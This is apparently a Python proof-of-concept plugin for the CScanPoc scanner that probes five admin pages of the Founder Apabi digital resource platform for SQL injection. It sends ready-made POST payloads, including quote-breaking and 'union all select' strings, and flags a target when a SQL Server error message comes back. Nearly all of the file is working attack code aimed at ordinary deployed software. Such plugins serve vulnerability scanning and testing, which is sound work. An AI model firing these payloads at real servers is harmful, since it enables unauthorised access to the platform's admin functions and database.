# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'Founder_0002' # 平台漏洞编号，留空
    name = '方正Apabi数字资源平台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-08'  # 漏洞公布时间
    desc = '''
        方正Apabi数字资源平台多处存在QL注入漏洞：
        '/tasi/admin/system/tutordept.asp'
        '/tasi/admin/system/language.asp'
        '/tasi/admin/system/subject.asp'
        '/tasi/admin/system/usermng.asp'
        '/tasi/admin/system/fileformat.asp'
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '方正Apabi数字资源平台'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f5cadd55-651b-4ee1-920c-203be8d777ba'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payloads = {
                '/tasi/admin/system/tutordept.asp':'txtDeptName=aaa%27&did=0&action=add&page=0&btnNewSaveDept=%B1%A3%B4%E6',\
                '/tasi/admin/system/language.asp':'editLangCode=-1%27%20union%20all%20select%201%20--&editLangName=SS&langid=&action=add&btnSaveLang=%B1%A3%B4%E6',\
                '/tasi/admin/system/subject.asp':'editSClassCode=01&editSClassName=%D5%DC%D1%A7%27&dtype=1&scid=1&type=modify&btnSaveSClass=%B1%A3%B4%E6',\
                '/tasi/admin/system/usermng.asp':'txtLogin=dd%27&txtPassword=dd&txtName=dd&cboUserType=0&txtDesc=dd&userid=0&oldlogin=&action=add&btnEditSaveUser=%B1%A3%B4%E6',\
                '/tasi/admin/system/fileformat.asp':'txtFormatName=sss%27&txtFormatExt=sss&txtFormatVersion=sss&cboFileType=1&formatid=0&action=add&btnSaveFormat=%B1%A3%B4%E6'
            }
            for payload in payloads:
                verity_url = self.target + payload
                code, head,res, errcode, _ = hh.http(verity_url, payloads[payload])
                if 'Microsoft OLE DB Provider for SQL Server' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
